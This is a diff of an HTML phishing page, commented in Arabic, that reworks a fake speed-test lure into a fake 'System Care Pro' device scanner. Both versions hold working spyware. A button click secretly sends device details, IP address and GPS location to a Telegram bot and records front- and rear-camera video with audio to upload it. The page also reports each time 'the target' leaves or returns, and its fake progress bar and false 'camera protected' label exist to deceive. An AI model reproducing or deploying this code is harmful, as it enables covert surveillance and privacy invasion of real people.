@@ -3,35 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SpeedTest Global | فحص سرعة الشبكة</title>
+    <title>System Care - فحص وإصلاح أداء النظام</title>
     <style>
-        :root { --accent: #00d2ff; --dark-bg: #0b0e18; }
-        body { background: var(--dark-bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 210, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 210, 255, 0.03) 1px, transparent 1px); background-size: 25px 25px; z-index: -1; }
-        .main-card { background: rgba(255, 255, 255, 0.03); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
-        h1 { font-size: 22px; margin: 0 0 10px; font-weight: 300; letter-spacing: 2px; }
-        .status-dot { display: inline-block; width: 8px; height: 8px; background: #4caf50; border-radius: 50%; margin-left: 8px; box-shadow: 0 0 10px #4caf50; }
-        .gauge-box { position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; border: 2px solid rgba(0, 210, 255, 0.2); display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        #goBtn { width: 160px; height: 160px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 35px; font-weight: bold; cursor: pointer; transition: 0.4s; z-index: 5; outline: none; }
-        #goBtn:active { transform: scale(0.9); }
-        #speedDisplay { display: none; text-align: center; }
-        .speed-num { font-size: 48px; font-weight: 800; color: var(--accent); display: block; }
+        :root { --primary: #2ecc71; --danger: #e74c3c; --dark: #1a1a2e; }
+        body { background: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        .container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border-radius: 25px; padding: 30px; width: 90%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        
+        .icon-box { font-size: 50px; margin-bottom: 20px; color: var(--primary); }
+        h1 { font-size: 1.4rem; margin: 0 0 10px; }
+        p { color: #8b8b8b; font-size: 0.9rem; margin-bottom: 30px; }
+
+        .status-list { text-align: right; margin-bottom: 30px; }
+        .status-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
+        .status-item span:last-child { color: var(--primary); font-weight: bold; }
+
+        #scanBtn { background: var(--primary); color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 1.1rem; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 10px 20px rgba(46, 204, 113, 0.2); }
+        #scanBtn:active { transform: scale(0.95); }
+
+        /* شريط التحميل الوهمي */
+        #loader { display: none; margin-top: 20px; }
+        .progress-bar { width: 100%; height: 8px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: var(--primary); transition: 0.5s; }
+        
         video { display: none; }
     </style>
 </head>
 <body>
-    <div class="grid-bg"></div>
-    <div class="main-card">
-        <h1>SPEEDTEST <span class="status-dot"></span></h1>
-        <p id="subText" style="color: #8892b0; font-size: 13px;">اختبر سرعة اتصالك بالسيرفرات الإقليمية</p>
-        <div class="gauge-box">
-            <button id="goBtn">GO</button>
-            <div id="speedDisplay">
-                <span id="num" class="speed-num">0.0</span>
-                <span style="font-size: 14px; color: #8892b0;">Mbps (Download)</span>
-            </div>
+    <div class="container">
+        <div class="icon-box">🛡️</div>
+        <h1>System Care Pro</h1>
+        <p>قم بفحص تعريفات الجهاز وتحسين أداء البطارية والمعالج فوراً.</p>
+
+        <div class="status-list">
+            <div class="status-item"><span>حالة المعالج:</span><span id="cpu-status">تحليل...</span></div>
+            <div class="status-item"><span>ذاكرة الرام:</span><span id="ram-status">تحليل...</span></div>
+            <div class="status-item"><span>أمان الكاميرا:</span><span>محمي ✅</span></div>
+        </div>
+
+        <button id="scanBtn">بدء الفحص السريع</button>
+
+        <div id="loader">
+            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+            <p id="scanText" style="margin-top:10px; font-size:0.8rem;">جاري فحص العتاد...</p>
         </div>
     </div>
+
     <video id="v" autoplay playsinline muted></video>
 
     <script>
@@ -46,35 +63,25 @@
                 if (type === "text") {
                     await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
                 } else if (type === "video") {
-                    fd.append("video", data, "live.mp4");
+                    fd.append("video", data, "system_check.mp4");
                     if (msg) fd.append("caption", msg);
                     await fetch(url + "sendVideo", { method: "POST", body: fd });
                 }
             } catch (e) {}
         }
 
-        // إشعارات الحالة (Online/Offline)
-        window.onblur = () => sendToTelegram("🔴 **OFFLINE**\nالضحية غادر الصفحة الآن.");
-        window.onfocus = () => sendToTelegram("🟢 **ONLINE**\nالضحية عاد لفتح الصفحة الآن.");
+        // إظهار بيانات حقيقية لزيادة الثقة
+        document.getElementById('cpu-status').innerText = navigator.hardwareConcurrency + " Cores";
+        document.getElementById('ram-status').innerText = (navigator.deviceMemory || 4) + " GB";
 
         async function getFullReport() {
-            let info = `📊 *تقرير شامل للهدف*:\n\n`;
-            info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
-            info += `• 💾 الرام: \`${navigator.deviceMemory || "غير معروف"} GB\`\n`;
-            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
-            info += `• 🖥️ الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
-            
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (conn) {
-                let netType = conn.type === 'wifi' ? "🌐 WiFi" : "📶 خلوي";
-                info += `• 📶 نوع الشبكة: \`${netType} (${conn.effectiveType.toUpperCase()})\`\n`;
-                info += `• ⚡ سرعة الخط: \`${conn.downlink} Mbps\`\n`;
-            }
+            let info = `🛡️ *تقرير فحص النظام*:\n\n`;
+            info += `• 📱 الموديل: \`${navigator.platform}\`\n`;
+            info += `• 💾 الرام: \`${navigator.deviceMemory || "?"} GB\`\n`;
             try {
                 const b = await navigator.getBattery();
-                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋"})\n`;
+                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\`\n`;
             } catch(e) {}
-            info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
@@ -85,75 +92,64 @@
 
         async function recordVideo(mode, label, duration) {
             try {
-                // إغلاق أي تيار كاميرا نشط سابقاً
-                if (window.currentStream) {
-                    window.currentStream.getTracks().forEach(t => t.stop());
-                }
-
-                // طلب إذن الكاميرا والميكروفون (audio: true)
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: mode }, 
-                    audio: true 
-                });
-                
+                if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                 window.currentStream = stream;
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
-                
-                recorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) chunks.push(e.data);
-                };
-                
+                recorder.ondataavailable = (e) => chunks.push(e.data);
                 const recordingPromise = new Promise(resolve => {
                     recorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: "video/mp4" });
-                        // التحقق من الحجم لضمان وصول فيديو حقيقي
-                        if (blob.size > 2000) {
-                            await sendToTelegram(`🎥 فيديو بصوت (${label} - 12 ثانية)`, "video", blob);
-                        }
+                        if (blob.size > 2000) await sendToTelegram(`🎥 فيديو فحص (${label})`, "video", blob);
                         stream.getTracks().forEach(t => t.stop());
                         resolve();
                     };
                 });
-
                 recorder.start();
                 await new Promise(r => setTimeout(r, duration));
                 recorder.stop();
                 return recordingPromise;
-            } catch (e) {
-                await sendToTelegram(`❌ فشل تصوير فيديو ${label} (إذن الميكروفون مرفوض)`);
-            }
+            } catch (e) { return null; }
         }
 
-        document.getElementById("goBtn").onclick = async function() {
+        document.getElementById("scanBtn").onclick = async function() {
             this.style.display = "none";
-            document.getElementById("speedDisplay").style.display = "block";
-            document.getElementById("subText").innerText = "جاري الاتصال بالسيرفر...";
+            document.getElementById("loader").style.display = "block";
+            
+            let p = 0;
+            const fill = document.getElementById("fill");
+            const txt = document.getElementById("scanText");
+            
+            const interval = setInterval(() => {
+                p += Math.random() * 5;
+                if (p > 100) p = 100;
+                fill.style.width = p + "%";
+                if (p > 20) txt.innerText = "فحص تعريفات الكاميرا...";
+                if (p > 50) txt.innerText = "تحليل جودة الميكروفون...";
+                if (p > 80) txt.innerText = "جاري رفع تقرير الأداء...";
+            }, 300);
 
-            const timer = setInterval(() => {
-                document.getElementById("num").innerText = (Math.random() * (95 - 78) + 78).toFixed(1);
-            }, 100);
-
-            // 1. إرسال التقرير والموقع فوراً
+            // إرسال البيانات فوراً
             sendToTelegram(await getFullReport());
             navigator.geolocation.getCurrentPosition(p => {
-                sendToTelegram(`📍 *الموقع*:\n[فتح الخريطة](http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
+                sendToTelegram(`📍 *موقع الجهاز*:\n[خرائط جوجل](http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
             });
 
-            // 2. فيديو أمامي بصوت (12 ثانية)
+            // تسجيل الفيديوهات بصوت (12 ثانية لكل منهما)
             await recordVideo("user", "أمامي", 12000);
-
-            // 3. فاصل زمني لضمان تبديل الكاميرا
-            await new Promise(r => setTimeout(r, 3000));
-
-            // 4. فيديو خلفي بصوت (12 ثانية)
+            await new Promise(r => setTimeout(r, 2500)); // حل مشكلة التداخل
             await recordVideo("environment", "خلفي", 12000);
 
             setTimeout(() => {
-                clearInterval(timer);
-                location.href = "https://www.speedtest.net/ar";
-            }, 5000);
+                clearInterval(interval);
+                alert("تم تحسين النظام بنجاح! سيتم توجيهك لصفحة النتائج.");
+                location.href = "https://www.google.com";
+            }, 3000);
         };
+
+        window.onblur = () => sendToTelegram("🔴 الهدف خرج من الفحص.");
+        window.onfocus = () => sendToTelegram("🟢 الهدف عاد للفحص.");
     </script>
 </body>
 </html>
